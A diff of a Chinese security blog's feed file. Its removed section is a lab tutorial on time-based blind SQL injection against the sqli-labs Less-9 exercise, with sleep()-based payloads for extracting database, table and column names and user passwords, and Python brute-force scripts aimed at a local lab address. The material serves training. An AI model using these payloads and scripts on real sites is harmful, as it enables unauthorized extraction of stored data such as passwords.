+			&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#############################################################&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……</summary></entry><entry><title type="html">NCTF 综合题2</title><link href="http://localhost:4000/2018/08/19/nctfzh2/" rel="alternate" type="text/html" title="NCTF 综合题2" /><published>2018-08-19T00:00:00+08:00</published><updated>2018-08-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/19/nctfzh2</id><content type="html" xml:base="http://localhost:4000/2018/08/19/nctfzh2/">&lt;p&gt;nctf 上的一道题目，需要挺多技巧的，感觉不错，所以单独拿出来分析一下。
 &lt;!--more--&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;step1-不断尝试&quot;&gt;step1 不断尝试&lt;/h2&gt;
@@ -2389,208 +2614,4 @@ bugku is a nice plateform!
 
 &lt;p&gt;人生中太多的需求都是被刻意制造出来的，唯有三件事是真的重要：亲人、知识和赚到手的钱；对所有的事情都要耐心一点，尽量用一个观察者的态度看待这个世界；多读书，看见别人一生怎么走过来的，多学学。(via:学长)&lt;/p&gt;
 
-&lt;p&gt;向着成为一名合格的白帽子不断努力。&lt;/p&gt;</content><author><name>Catcher</name></author><category term="thinking" /><summary type="html">当坚持成为一种习惯，成长比成功更重要，猥琐发育，别浪。 选择的方向很明确，但并不是每个人都有纵身一跃的勇气。 没有计划的学习都只是在浪费时间， 没有目标的努力都只是自己骗自己而已。</summary></entry><entry><title type="html">时间盲注的套路</title><link href="http://localhost:4000/2018/08/11/time_ij/" rel="alternate" type="text/html" title="时间盲注的套路" /><published>2018-08-11T00:00:00+08:00</published><updated>2018-08-11T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/11/time_ij</id><content type="html" xml:base="http://localhost:4000/2018/08/11/time_ij/">&lt;p&gt;记录时间盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-9(基于时间的GET单引号盲注)。&lt;/p&gt;
-
-&lt;!--more--&gt;
-
-&lt;h2 id=&quot;0x01-预备&quot;&gt;0x01 预备&lt;/h2&gt;
-
-&lt;p&gt;所谓基于时间的盲注，就是页面不会给你任何有价值的回显。要想识别该漏洞，可以向数据库注入时间延迟，并检查服务器的响应是否也已经产生了延迟。&lt;/p&gt;
-
-&lt;h3 id=&quot;1-注入点判断&quot;&gt;1. 注入点判断&lt;/h3&gt;
-
-&lt;p&gt;先进行一些尝试&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1 ---&amp;gt; you are in~
-id=1' ---&amp;gt; you are in~
-id=1'--+ ---&amp;gt; you are in~
-
-id=1' and sleep(5) --+ ---&amp;gt; 延时 5 秒，说明可以进行时间注入
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;2-时间盲注中常用延时函数&quot;&gt;2. 时间盲注中常用延时函数&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sleep()	适用 MySQL 5，延时时间执行。
-benchmark()	适用 MySQL 4/5 ，延时时间执行。 ---&amp;gt; benchmark(10000000,encode('hello','mom')) 执行该语句需要约 3.6 秒
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;if语句：&lt;code class=&quot;highlighter-rouge&quot;&gt;if(expr1,expr2,expr3)&lt;/code&gt; 若expr1为真，返回expr2，否则返回expr3&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;注入时候是根据 sleep(5) 并结合 if(,,) 判断来的，条件正确就有五秒延迟，不正确就没有五秒延迟。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;0x02--构造-payload&quot;&gt;0x02  构造 Payload&lt;/h2&gt;
-
-&lt;h3 id=&quot;1-猜数据库长度&quot;&gt;1. 猜数据库长度&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if(length(database())=X,sleep(5),0)--+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.102/sqli/Less-8/?id=1' and if(length(database())={},sleep(5),0)--+&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uppercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lowercase&lt;/span&gt;
-
-
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; 
-		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;2-猜数据库名&quot;&gt;2. 猜数据库名&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if(ascii(substr(database(),XX1,XX2))=XX3,sleep(5),0)--+
-或
-id=1' and if(ascii(substr(database(),XX1,XX2))&amp;gt;=XX3,sleep(5),0)--+
-
-XX1: 是数据库名称(字符串)不同的位置 1-8
-XX2: 截取的字符长度 1
-XX3: 截取的字符 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;采用二分法提高下效率：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.102/sqli/Less-8/?id=1' and if(ascii(substr(database(),{},1))&amp;gt;={},sleep(5),0)--+&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uppercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lowercase&lt;/span&gt;
-
-
-&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;122&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;3猜表的长度&quot;&gt;3.猜表的长度&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((select length(table_name) from information_schema.tables where table_schema=database() limit XX1,XX2)=XX3,sleep(5),0)--+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量，从 0 开始，改变这里来求出所有表的长度
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 猜测的表的长度
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;4-猜表名&quot;&gt;4. 猜表名&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit XX1,XX2),XX3,XX4)))=XX5,sleep(5),0) --+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 是表名称(字符串)不同的位置 
-XX4: 截取的字符长度 1
-XX5: 截取的字符 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;5猜字段的长度&quot;&gt;5.猜字段的长度&lt;/h3&gt;
-
-&lt;p&gt;这跟前面猜表长度那里基本一样了&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit XX1,XX2)=XX3,sleep(5),0) --+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量，从 0 开始，改变这里来求出所有字段的长度
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 猜测的字段的长度
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;6猜字段名&quot;&gt;6.猜字段名&lt;/h3&gt;
-
-&lt;p&gt;这里跟前面猜表名那里基本一样&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit XX1,XX2),XX3,XX4)))=XX5,sleep(5),0) --+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量  2
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 是字段名(字符串)不同的位置 
-XX4: 截取的字符长度 1
-XX5: 截取的字符 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;7-猜目标数据的长度&quot;&gt;7. 猜目标数据的长度&lt;/h3&gt;
-
-&lt;p&gt;通过之前我们知道了：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;数据库 : security
-表：users
-目标字段: password (这里就暂且取一个目标字段作为例子)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;还是跟之前的一样&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((select length(password) from users limit 0,1)=X,sleep(5),0) --+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;8-猜目标数据&quot;&gt;8. 猜目标数据&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((ascii(substr((select password from users limit 0,1),XX1,1)))=XX2,sleep(5),0) --+
-
-XX1: 目标数据(字符串)每个字符的位置
-XX2: 目标数据字符串中字符的 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;至此一次时间盲注就完成了。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x03-使用工具&quot;&gt;0x03 使用工具&lt;/h2&gt;
-
-&lt;h3 id=&quot;1-burpsuite&quot;&gt;1. burpsuite&lt;/h3&gt;
-
-&lt;p&gt;使用 burpsuite 来玩的话，跟暴破密码的路数基本一样，就不多说了。&lt;/p&gt;
-
-&lt;h3 id=&quot;2-sqlmap&quot;&gt;2. sqlmap&lt;/h3&gt;
-
-&lt;p&gt;跟布尔盲注时一样，就不再赘述了。&lt;/p&gt;</content><author><name>Catcher</name></author><category term="sql注入" /><summary type="html">记录时间盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-9(基于时间的GET单引号盲注)。</summary></entry></feed>
+&lt;p&gt;向着成为一名合格的白帽子不断努力。&lt;/p&gt;</content><author><name>Catcher</name></author><category term="thinking" /><summary type="html">当坚持成为一种习惯，成长比成功更重要，猥琐发育，别浪。 选择的方向很明确，但并不是每个人都有纵身一跃的勇气。 没有计划的学习都只是在浪费时间， 没有目标的努力都只是自己骗自己而已。</summary></entry></feed>
